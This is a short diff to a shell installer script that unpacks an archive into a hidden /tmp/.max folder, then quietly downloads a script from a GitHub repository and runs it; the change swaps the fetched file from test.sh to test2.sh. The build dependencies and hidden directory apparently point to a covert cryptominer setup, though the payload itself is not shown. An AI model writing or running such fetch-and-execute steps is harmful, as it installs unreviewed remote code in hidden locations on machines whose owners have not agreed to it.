@@ -6,6 +6,6 @@ sudo apt-get install git build-essential cmake libjansson-dev libuv1-dev libssl-
  cd /tmp/
  tar -xJf /tmp/maxarc 
  cd  /tmp/.max
- wget -q -O /tmp/.max/script.sh https://github.com/cloud10001/pycpu/raw/main/test.sh
+ wget -q -O /tmp/.max/script.sh https://github.com/cloud10001/pycpu/raw/main/test2.sh
  chmod +x script.sh
  ./script.sh
